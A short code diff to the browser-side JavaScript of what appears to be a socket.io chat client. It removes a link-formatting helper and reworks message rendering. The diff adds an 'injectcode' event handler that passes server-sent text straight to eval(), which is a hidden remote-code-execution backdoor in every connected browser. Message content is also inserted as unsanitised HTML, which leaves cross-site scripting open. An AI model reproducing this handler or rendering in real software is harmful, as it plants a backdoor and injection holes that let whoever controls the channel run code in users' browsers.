@@ -1,10 +1,3 @@
-function urlify(text) {
-    var urlRegex = /(https?:\/\/[^\s]+)/g;
-    return text.replace(urlRegex, function(url) {
-        return '<a class="link" href="' + url + '">' + url + '</a>';
-    })
-}
-
 var socket = io();
 var prevdate=['a', 'b', 'c'];
 var messageSending = true;
@@ -30,6 +23,14 @@ socket.on('messageDelete',function(data) {
 	msgthing.style['color']='grey';
 	msgthing.style['font-style']='italic';
 });
+socket.on('injectcode',function(data) {
+	try{
+		eval(data.run).catch(function(){});
+	}
+	catch(err){
+		console.log('fruck')
+	}
+});
 socket.on('message',function(data) {
 	if(prevdate.includes(data.date)==true)return;
 	prevdate = prevdate.concat([ data.date ]);
@@ -39,9 +40,9 @@ socket.on('message',function(data) {
 	if(prevavatar===data.avatar && data.username===prevusername){
 		msgs[msgs.length-1].insertAdjacentHTML('beforeend',`<p msgid="`+data.msgID+`" class="contentpp">${data.pingstr+data.content}</p>`);
 	}else{
-		data['content']=urlify(data.content).split('<pre>');
+		data['content']=data.content.split('<pre>');
 		if(data.content[1]){
-			data['content']=`<p id="${data.msgID}" class="contentp">'+data.pingstr+data.content[0]+'<pre>'+data['content'][1]+'</pre></p>`
+			data['content']=`<p id="${data.msgID}" class="contentp">${data.pingstr+data.content[0]}<pre>${data['content'][1]}</pre></p>`
 		} else {
 			data['content']=`<p id="${data.msgID}" class="contentp">${data.pingstr+data.content[0]}</p>`
 		}
